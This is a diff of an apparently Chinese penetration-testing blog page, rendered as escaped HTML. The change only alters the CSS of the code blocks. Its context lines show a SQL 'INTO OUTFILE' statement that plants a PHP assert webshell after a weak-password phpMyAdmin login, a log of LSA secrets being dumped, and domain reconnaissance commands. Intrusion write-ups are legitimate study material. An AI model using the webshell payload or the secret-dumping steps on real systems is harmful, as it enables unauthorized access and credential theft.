@@ -222,7 +222,7 @@
 &lt;p&gt;回收站的CLISD是：&lt;code&gt;::{645FF040-5081-101B-9F08-00AA002F954E}&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id="clsid是如何创建的"&gt;CLSID是如何创建的&lt;/h3&gt;
 &lt;p&gt;CLSID结构体：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_GUID&lt;/span&gt; {  
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;_GUID&lt;/span&gt; {  
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	DWORD Data1; &lt;span style="color:#75715e"&gt;// 随机数  
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	WORD Data2; &lt;span style="color:#75715e"&gt;// 和时间相关  
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	WORD Data3; &lt;span style="color:#75715e"&gt;// 和时间相关  
@@ -462,7 +462,7 @@ SMB 192.168.3.5 445 LIYINGZHEA30B [+] Dumped 5 LSA secrets to /root/.cme/logs/LI
 &lt;li&gt;开放端口 - 发现开启了防火墙&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;扫描到它存在&lt;code&gt;phpMyadmin&lt;/code&gt;，弱口令登录进入，通过常规手法SQL写入shell。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;lt;?php @assert($_POST[&amp;#34;qyxmsq56dhaye3&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;INTO&lt;/span&gt; OUTFILE &lt;span style="color:#e6db74"&gt;&amp;#39;D:/WWW/***/master/&amp;#39;&lt;/span&gt;;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;lt;?php @assert($_POST[&amp;#34;qyxmsq56dhaye3&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;INTO&lt;/span&gt; OUTFILE &lt;span style="color:#e6db74"&gt;&amp;#39;D:/WWW/***/master/&amp;#39;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;D:\WWW\***\master\&amp;gt; net user /domain
 这项请求将在域 WORKGROUP 的域控制器处理。
